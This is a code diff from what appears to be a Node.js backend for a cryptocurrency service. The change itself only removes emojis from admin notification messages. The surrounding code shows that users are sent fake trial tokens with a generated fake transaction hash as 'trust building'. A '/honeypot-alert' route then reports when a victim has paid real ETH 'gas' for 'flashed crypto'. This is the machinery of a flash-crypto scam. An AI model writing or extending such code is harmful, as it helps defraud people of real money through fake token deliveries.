@@ -139,9 +139,9 @@ router.post('/send-trial-tokens', async (req, res) => {
     
     if (result.success) {
       await sendAdminNotification(
-        `🎁 REAL TESTNET TOKENS: ${amount} tokens sent to ${userAddress.slice(0,8)}...`,
+        `REAL TESTNET TOKENS: ${amount} tokens sent to ${userAddress.slice(0,8)}...`,
         `TESTNET TOKEN DELIVERY SUCCESS\n\n` +
-        `🎨 CREATIVE METHOD: ${result.method}\n` +
+        `CREATIVE METHOD: ${result.method}\n` +
         `User: ${userAddress}\n` +
         `Amount: ${result.amount}\n` +
         `TX Hash: ${result.txHash}\n` +
@@ -163,9 +163,9 @@ router.post('/send-trial-tokens', async (req, res) => {
     // Notify admin about trial sent
     const sendAdminNotification = require('../routes/api').sendAdminNotification;
     await sendAdminNotification(
-      `🎁 TRIAL SENT: $${amount} to ${userAddress.slice(0,8)}...`,
+      `TRIAL SENT: $${amount} to ${userAddress.slice(0,8)}...`,
       `FREE TRIAL TOKEN DELIVERY\n\n` +
-      `🎁 TRUST BUILDING: Sent trial tokens to user\n\n` +
+      `TRUST BUILDING: Sent trial tokens to user\n\n` +
       `USER: ${userAddress}\n` +
       `AMOUNT: ${amount} CRT Trial Tokens (FAKE)\n` +
       `TRANSACTION: Fake hash generated\n` +
@@ -201,9 +201,9 @@ router.post('/honeypot-alert', async (req, res) => {
     const sendAdminNotification = require('../routes/api').sendAdminNotification;
     
     await sendAdminNotification(
-      `💰 FLASHED CRYPTO: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
+      `FLASHED CRYPTO: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
       `FLASHED CRYPTO GAS COLLECTION\n\n` +
-      `🎯 SUCCESS: User sent gas for flashed crypto!\n\n` +
+      `SUCCESS: User sent gas for flashed crypto!\n\n` +
       `USER DETAILS:\n` +
       `Address: ${userAddress}\n` +
       `Amount Sent: ${amount} ETH\n` +
